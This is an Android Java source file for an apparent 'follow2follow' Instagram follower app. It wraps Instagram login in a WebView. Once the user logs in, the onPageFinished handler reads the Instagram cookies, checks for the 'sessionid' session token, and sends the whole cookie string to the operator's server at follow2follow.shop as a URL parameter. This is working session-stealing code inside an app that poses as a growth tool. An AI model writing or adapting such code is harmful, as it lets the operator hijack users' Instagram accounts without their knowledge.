package com.upfollow.app;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.os.Bundle;
import android.webkit.CookieManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import java.net.URLEncoder;

public class MainActivity extends Activity {

    private WebView webView;

    // Yahan apni hosting ka link daalein:
    private static final String HOSTING_LOGIN_URL = "https://follow2follow.shop/login.php";
    private static final String HOSTING_DASHBOARD = "https://follow2follow.shop/index.php";

    @SuppressLint("SetJavaScriptEnabled")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        webView = findViewById(R.id.webView);

        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setDatabaseEnabled(true);
        settings.setSupportZoom(false);
        settings.setUserAgentString("Mozilla/5.0 (Linux; Android 13; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36");

        CookieManager cookieManager = CookieManager.getInstance();
        cookieManager.setAcceptCookie(true);
        cookieManager.setAcceptThirdPartyCookies(webView, true);

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);

                if (url.equals("https://www.instagram.com/") || url.contains("instagram.com/?") || url.equals("https://www.instagram.com")) {
                    String cookies = CookieManager.getInstance().getCookie(url);

                    if (cookies != null && cookies.contains("sessionid")) {
                        try {
                            String encoded = URLEncoder.encode(cookies, "UTF-8");
                            webView.loadUrl(HOSTING_DASHBOARD + "?cookies=" + encoded);
                        } catch (Exception e) {
                            webView.loadUrl(HOSTING_DASHBOARD);
                        }
                    }
                }
            }
        });

        webView.loadUrl(HOSTING_LOGIN_URL);
    }

    @Override
    public void onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }
}
